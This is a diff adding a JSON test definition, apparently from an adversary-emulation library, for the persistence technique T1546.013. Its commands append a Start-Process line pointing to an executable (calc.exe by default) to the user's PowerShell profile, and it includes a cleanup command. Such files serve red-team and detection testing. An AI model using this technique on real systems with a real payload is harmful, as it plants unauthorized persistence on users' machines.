@@ -1,0 +1,43 @@
+{
+    "name": "Append malicious start-process cmdlet",
+    "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "Add-Content #{ps_profile} -Value \"\"\nAdd-Content #{ps_profile} -Value \"Start-Process #{exe_path}\"\npowershell -Command exit\n",
+        "cleanup_command": "$oldprofile = cat $profile | Select-Object -skiplast 1\nSet-Content $profile -Value $oldprofile\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1546.013",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "PowerShell Profile",
+    "source": "ART",
+    "uuid": "090e5aa5-32b6-473b-a49b-21e843a56896",
+    "arguments": {
+        "exe_path": {
+            "description": "Path the malicious executable",
+            "type": "path",
+            "default": "calc.exe"
+        },
+        "ps_profile": {
+            "description": "Powershell profile to use",
+            "type": "string",
+            "default": "$profile"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Ensure a powershell profile exists for the current user\n",
+            "prereq_command": "if (Test-Path #{ps_profile}) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Path #{ps_profile} -Type File -Force\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
